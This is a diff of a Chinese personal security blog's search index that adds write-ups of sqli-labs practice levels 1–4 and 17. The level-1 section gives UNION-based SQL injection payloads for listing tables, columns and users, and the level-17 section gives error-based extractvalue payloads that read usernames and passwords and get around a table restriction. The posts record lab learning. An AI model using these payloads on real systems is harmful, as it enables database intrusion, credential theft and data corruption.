@@ -383,14 +383,23 @@ io.interactive()
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs</title>
+    <title>sqli-labs(1-4)</title>
     <url>/2019/12/25/sqli-lab/</url>
     <content><![CDATA[<p>前言</p>
 <pre><code>最近在研究sql注入，sqli-labs是一个专业的sql注入练习平台，于是自己搭建了一个，记录一下学习过程。</code></pre><p>Less-1</p>
 <p> 根据提示可以知道，这是一道单引号注入的题目<br> 首先他让我们输入ID<br><img src="/2019/12/25/sqli-lab/05ab1d2d3f4f5421f749a046d8f3a56.png" alt><br>    先get一个参数进行测试</p>
 <a id="more"></a>    
 <p><img src="/2019/12/25/sqli-lab/d336f99bd2f6e61ef828e16e4b4d2b0.png" alt><br>    正常回显，根据提示进行单引号测试<br><img src="/2019/12/25/sqli-lab/b8c6f552da136996e0fb2847121c8d2.png" alt><br>    可以发现已经报错，这里先把报错语句拿出来<br>    ‘’1’’ LIMIT 0,1’ at line 1<br>    这里首尾两个’是输出用的而 ‘1’’ 中的1’便是你输入的参数值<br>    将这个语句放入正常语句中进行分析<br>    select * from A where id =’1’’ limit 0,1<br>    可以发现正是由于id值中传入了一个 ‘ ,使得正常的语句多了一个 ‘ 发生了错误。<br>    所以我们可以利用这一点，构造我们需要的语句<br>    select * from A where id =’1’ 需要的注入语句 –+’ limit 0,1<br>    这样我们就可以通过不同的注入语句获得我们需要的信息<br>    注入的通常流程：<br>        1、确定现有sql语句到底查询了多少个字段以及各字段的类型<br>        2、确定了字段个数再查询显示位<br>        3、在从当前显示位上查询出当前数据库、当前用户等我们所需要的数据<br>    实际操作一下<br>    构造字段查询语句<br>    payload：’ order by 3 –+<br>    可以看到页面正常回显<br><img src="/2019/12/25/sqli-lab/3785c8fcbaff654858efb5899d54a93.png" alt><br>    将3改为4<br><img src="/2019/12/25/sqli-lab/a30015d7c3cbff602cc0443c9ffd91e.png" alt><br>    发生报错，证明只存在三个字段<br>    接着确定可以回显的字段<br>    payload：-1’ union select 1,2,3 –+<br><img src="/2019/12/25/sqli-lab/81e3539614352a2e5bf5eece18a765f.png" alt><br>    可以看到2，3被显示在页面上，也就是说我们要将查询语句构造在2，3号位才可以获得相应的数据<br>    下面列出几个常用的查询语句：<br>        1、查询表：-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_scheme= database() –+<br>        2、查询列：-1’ union selecr 1,group_concat(column_name),3 from information_schema.conluns where table_name=”users” –+<br>        3、查询字段：-1’ union select 1,group_concat(A,B,C),3 from users –+<br>    注：仅使用于MySQL数据库&gt;=5.0.1以上版本</p>
-<pre><code>-------------------分割线------------------</code></pre>]]></content>
+<p>——————-分割线——————</p>
+<p>less-2 </p>
+<pre><code>这一关，通过提示可以知道也属于报错注入，不过是int型，不需要进行单引号闭合了
+
+其他与第一关的操作方法相同</code></pre><p>——————-分割线——————</p>
+<p>less-3</p>
+<pre><code>第三关与第一关类型完全一样，只不过闭合方式发生该变，只需要“ &apos; ”
+改为“ &apos;) ” 其他与第一关相同。</code></pre><p>less-4</p>
+<pre><code>同上，将只需要“ &apos; ”
+改为“ &quot; ” 其他与第一关相同。</code></pre>]]></content>
       <categories>
         <category>SQL注入</category>
       </categories>
@@ -427,6 +436,32 @@ eg: 还有system(&apos;ls&apos;)的读取方法但是这里应该没有权限.</
       <tags>
         <tag>Web</tag>
         <tag>注入技巧</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab less-17</title>
+    <url>/2020/07/27/sqli-lab-less-17/</url>
+    <content><![CDATA[<p>17关相比于之前关卡有很大不同，这一关注入点在密码上<br>一开始并没有任何思绪，于是只能观察源码</p>
+<a id="more"></a>    
+<p><img src="/2020/07/27/sqli-lab-less-17/image1.png" alt><br>从源码中可以看到：接收到用户POST的uname和passwd后，首先根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
+<p>这一关使用报错注入<br>一般常用的报错注入有updatexml()、 extractvaule()和floor(),在这里floor()函数用不了<br>剩下两个都可以用，首先介绍下两个函数的用法<br>1、updatexml()<br> UpdateXML(xml_target, xpath_expr, new_xml)<br>这是updatexml()的基本用法，可以看出需要三个参数<br>第一个参数是目标是针对于xml文档<br>第二参数是xpath的表达<br> 第三个参数是将xpath表达式转换成什么，也就是替换查找到的符合条件的数据<br>2、 extractvaule()<br>extractvalue(目标xml文档，xml路径)<br>这里第二个参数的位置就是可以操作的地方<br>这里用采用第2种方法<br>–查表<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查列<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查用户名<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>在查找用户名的时候出现了问题</p>
+<p><img src="/2020/07/27/sqli-lab-less-17/image.png" alt>    </p>
+<p>报错了，通过查询换代码发现，后台限制了对users表的查询，不可以查询此表，因此我们可以将其换一个名字</p>
+<p>–绕过<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查密码<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from (select password from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>这里有一个问题， UpdateXML(xml_target, xpath_expr, new_xml)这个函数，第一、三参数是string类型</p>
+<p>我测试时采用了这个payload ：aa’ and updataxml(0x7e,(concat(1,(select table_name from information_schema.tables where table_schema=database() limit 1,1),1),1)#<br>于是我的数据库中的密码的值全部变成了1。。。</p>
+<p>在实际环境中，这样的测试肯定是不行的，所以尽可能不将参数设为int型</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>sqli-lab</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
 </search>
